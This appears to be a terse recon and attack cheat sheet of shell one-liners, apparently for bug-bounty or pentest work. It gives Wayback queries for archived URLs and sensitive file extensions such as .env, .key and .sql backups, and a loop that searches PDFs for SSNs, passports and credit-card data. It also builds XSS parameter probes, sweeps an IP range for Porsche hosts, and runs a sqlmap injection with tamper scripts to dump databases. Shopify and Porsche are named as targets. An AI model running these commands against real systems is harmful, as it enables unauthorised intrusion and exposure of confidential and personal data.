[https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey](https://web.archive.org/cdx/search/cdx?url=target.com/*&output=text&fl=original&collapse=urlkey)
For subdomains (wildcard search) [https://web.archive.org/cdx/search/cdx?url=*.pci.shopifyinc.com/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200](https://web.archive.org/cdx/search/cdx?url=*.pci.shopifyinc.com/*&output=text&fl=original&collapse=urlkey&filter=statuscode:200)

For specific extesnion [https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|git|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|apk|msi|env|dmg|tmp|crt|pem|key|pub|asc|js)$](https://web.archive.org/cdx/search/cdx?url=*.example.com/*&collapse=urlkey&output=text&fl=original&filter=original:.*\.\(xls|xml|xlsx|json|pdf|sql|doc|docx|pptx|txt|zip|tar\.gz|tgz|bak|7z|rar|log|cache|secret|db|backup|yml|gz|git|config|csv|yaml|md|md5|exe|dll|bin|ini|bat|sh|tar|deb|rpm|iso|img|apk|msi|env|dmg|tmp|crt|pem|key|pub|asc|js\)$)

Find sensitive Data in PDFs cat output.txt | grep -Ea '\.pdf' | while read -r url; do curl -s "$url" | pdftotext - - | grep -Eaiq '(internal use only|confidential|strictly private|personal & confidential|private|restricted|internal|not for distribution|do not share|proprietary|trade secret|classified|sensitive|bank statement|invoice|salary|contract|agreement|non disclosure|passport|social security|ssn|date of birth|credit card|identity|id number|company confidential|staff only|management only|internal only)' && echo "$url"; done

  

💰 👍 Find hidden params in javascript files  

assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"


getting full class
for i in $(seq 0 255); do
  echo "212.9.180.$i"
done > ips_212_9_180.txt


check which on belong
cat ips_84_21.txt ips_212_9_180.txt | sort -u   | httpx -ports "80,443,8080,8000,3000,8443,8888" -silent -timeout 10 -status-code -title -web-server -threads 100 | grep -i porsche   | awk '{print $1}'   | sed 's/\[//;s/\]//'   | sort -u > porsche_ips.txt


$ sqlmap -r reound.txt  --flush-session --dbs --banner --current-user --dbms=mysql --technique=BT  --time-sec=5 --level=3 --risk=2  --tamper=space2comment,randomcase --batch --threads=2 -v 3 --ignore-code 401
